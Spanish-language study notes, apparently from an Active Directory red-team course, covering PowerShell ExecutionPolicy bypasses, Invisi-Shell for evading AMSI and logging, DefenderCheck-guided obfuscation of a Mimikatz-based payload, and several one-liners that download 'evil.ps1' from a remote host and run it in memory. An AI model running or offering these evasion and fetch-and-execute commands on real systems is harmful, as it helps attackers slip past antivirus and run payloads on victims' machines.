
12-32

- Para enumeracion se usara powershell
- instalado de fabrica en todos los windows
- powershell no es powershell.exe es una dll, **System.Management.Automation.dll**
- ExecutionPolicy, no es una medida de seguridad, se hace para evitar ejecuciones accidentales, maneras de bypassear
```
- powershell -ExecutionPolicy bypass
- powershell -c <cmd>
- powershell -encodedcommand
- $env:PSExecutionPolicyPreference="bypass"
```






### INVISI-SHELL


sirve para evadir AMSI, CLM, SYSTEM-WIDE TRANSCRIPTION,SCRIPT BLOCK LOGGING mediante hooks a dos .NET Assemblies, **System.Management.Automation.dll** y **System.Core.dll**

para salir de la sesion se escribe **exit**



## AMSITrigger

```
AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
```

## DefenderCheck

para identificar que strings en concreto hacen saltar el defender
```
DefenderCheck.exe PowerUp.ps1
```

## Bytetolinenumber.ps1

te dice la linea de codigo en la que se ha detectado algo, en vez de  un offset


## Maneras de ofuscar


1. Remove default comments. 2. Rename the script, function names and variables. 3. Modify the variable names of the Win32 API calls that are detected. 4. Obfuscate PEBytes content → PowerKatz dll using packers. 5. Implement a reverse function for PEBytes to avoid any static signatures. 6. Add a sandbox check to waste dynamic analysis resources. 7. Remove Reflective PE warnings for a clean output. 8. Use obfuscated commands for Invoke-MimiEx execution. 9. Analysis using DefenderCheck.






































# COMANDOS

## Para cargar un script de powershell

```
. C:\AD\Tools\PowerView.ps1
```


## para importar un modulo o un script


```
Import-Module C:\AD\Tools\ADModule- master\ActiveDirectory\ActiveDirectory.psd1
```
## para listar todos los comandos de un modulo

```
All the commands in a module can be listed with: Get-Command -Module <modulename>
```

## para descargar un script y cargarlo en memoria

```
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
```
## otro metodo para descargar y cargar en memoria un script usando iexplorer
```
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1 ');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```
## carga y ejecucion en memoria de scripts en powershell a partir de la v3


```
iex (iwr 'http://192.168.230.1/evil.ps1')

```


## una manera más, usando XMLHTTP, una api antigua de microsoft


```
$h=New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://192.168.230.1/evil.ps1',$false)
$h.send()
iex $h.responseText

```



## ejecutar invisi-Shell con privilegios de admin

```
RunWithPathAsAdmin.bat
```

## ejecutar invisi-Shell sin privilegios de admin

```
RunWithRegistryNonAdmin.bat
```



